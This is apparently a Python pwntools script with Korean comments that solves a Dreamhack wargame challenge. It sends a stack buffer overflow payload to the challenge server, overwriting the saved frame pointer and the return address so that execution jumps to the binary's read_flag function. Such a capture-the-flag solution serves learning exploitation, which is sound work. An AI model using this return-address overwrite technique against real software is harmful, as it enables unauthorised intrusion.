from pwn import *

# 1. 연결 설정
# 로컬에서 테스트할 때는 process, 원격 서버는 remote 사용
# p = process('./basic_exploitation_001') 
p = remote('host3.dreamhack.games', 21110) # 포트 번호는 문제 페이지에서 확인 후 입력하세요.

# 2. 바이너리 정보 로드 (함수 주소를 자동으로 찾기 위함)
elf = ELF('./basic_exploitation_001')
read_flag_addr = elf.symbols['read_flag']

print(f"read_flag Address: {hex(read_flag_addr)}")

# 3. 페이로드 구성
# [Buffer 0x80 (128)] + [SFP (4)] + [RET (read_flag 주소)]
payload = b'A' * 0x80       # 버퍼 채우기
payload += b'B' * 0x04      # SFP 덮기
payload += p32(read_flag_addr) # Return Address를 read_flag로 덮기 (p32는 리틀 엔디안 패킹)

# 4. 페이로드 전송
p.sendline(payload)

# 5. 결과 확인 (플래그 출력)
p.interactive()